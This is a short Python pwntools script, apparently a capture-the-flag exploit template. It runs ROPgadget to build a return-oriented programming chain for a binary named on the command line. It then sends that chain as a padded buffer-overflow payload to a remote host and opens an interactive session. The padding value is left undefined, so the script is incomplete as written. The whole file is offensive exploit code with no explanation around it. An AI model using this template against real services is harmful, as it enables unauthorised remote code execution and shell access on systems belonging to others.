from pwn import *
from subprocess import Popen, PIPE
import sys

context.log_level = 'DEBUG'

if len(sys.argv) != 4:
    print("USAGE {}: python [SCRIPT] [BINARY] [HOST] [PORT]".format(sys.argv[0]))
    exit(0)

context.binary = sys.argv[1]
HOST = sys.argv[2]
PORT = sys.argv[3]
#padding =

stdout = Popen(["ROPgadget", "--ropchain", "--binary", context.binary.path], stdout=PIPE).communicate()[0]
pycode = stdout[stdout.find("#!"):].replace("\t", "")
exec(pycode)

ropchain = p

conn = remote(HOST, PORT)
conn.sendline(fit({padding:ropchain}))
conn.interactive()
conn.close()
